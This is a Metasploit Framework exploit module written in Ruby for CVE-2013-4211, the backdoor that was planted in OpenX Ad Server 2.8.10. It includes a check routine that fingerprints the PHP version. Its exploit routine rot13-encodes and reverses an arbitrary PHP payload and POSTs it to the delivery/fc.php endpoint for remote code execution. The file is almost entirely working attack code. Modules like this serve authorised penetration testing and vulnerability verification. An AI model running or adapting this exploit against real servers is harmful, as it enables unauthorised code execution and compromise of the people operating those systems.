# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;OpenX Backdoor PHP Code Execution&#039;,
      &#039;Description&#039;    => %q{
        OpenX Ad Server version 2.8.10 was shipped with an obfuscated
        backdoor since at least November 2012 through August 2013.
        Exploitation is simple, requiring only a single request with a
        rot13&#039;d and reversed payload.
      },
      &#039;Author&#039;         =>
        [
          &#039;egypt&#039;,   # Metasploit module, shouts to bperry for hooking me up with the vuln software
          &#039;Unknown&#039;, # Someone planted this backdoor...
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     => [
          [ &#039;CVE&#039;, &#039;2013-4211&#039; ],
          [ &#039;URL&#039;, &#039;http://www.heise.de/security/meldung/Achtung-Anzeigen-Server-OpenX-enthaelt-eine-Hintertuer-1929769.html&#039;],
          [ &#039;URL&#039;, &#039;http://forum.openx.org/index.php?showtopic=503521628&#039;],
        ],
      &#039;Privileged&#039;     => false,
      &#039;Payload&#039;        =>
        {
          &#039;DisableNops&#039; => true,
          # Arbitrary big number. The payload gets sent as POST data, so
          # really it&#039;s unlimited
          &#039;Space&#039;       => 262144, # 256k
        },
      &#039;DisclosureDate&#039; => &#039;Aug 07 2013&#039;,
      &#039;Platform&#039;       => &#039;php&#039;,
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Targets&#039;        => [[ &#039;Generic (PHP payload)&#039;, { }]],
      &#039;DefaultTarget&#039; => 0))

    register_options([
      OptString.new(&#039;TARGETURI&#039;, [true, "The URI to request", "/openx/"]),
    ], self.class)
  end

  def check
    token = rand_text_alpha(20)
    response = execute_php("echo &#039;#{token} &#039;.phpversion();die();")

    if response.nil?
      CheckCode::Unknown
    elsif response.body =~ /#{token} ((:?\d\.?)+)/
      print_status("PHP Version #{$1}")
      return CheckCode::Vulnerable
    end
    return CheckCode::Safe
  end

  def exploit
    execute_php(payload.encoded)

    handler
  end

  def execute_php(php_code)
    money = rot13(php_code.reverse)
    begin
      response = send_request_cgi( {
        &#039;method&#039; => "POST",
        &#039;global&#039; => true,
        &#039;uri&#039;    => normalize_uri(target_uri.path,"www","delivery","fc.php"),
        &#039;vars_get&#039; => {
          &#039;file_to_serve&#039; => "flowplayer/3.1.1/flowplayer-3.1.1.min.js",
          &#039;script&#039; => &#039;deliveryLog:vastServeVideoPlayer:player&#039;
        },
        &#039;vars_post&#039; => {
          &#039;vastPlayer&#039; => money
        },
      }, 0.1)
    rescue ::Rex::ConnectionError => e
      fail_with(Failure::Unreachable, e.message)
    rescue ::OpenSSL::SSL::SSLError
      fail_with(Failure::BadConfig, "The target failed to negotiate SSL, is this really an SSL service?")
    end

    response
  end

  def rot13(str)
    str.tr! "A-Za-z", "N-ZA-Mn-za-m"
  end

end

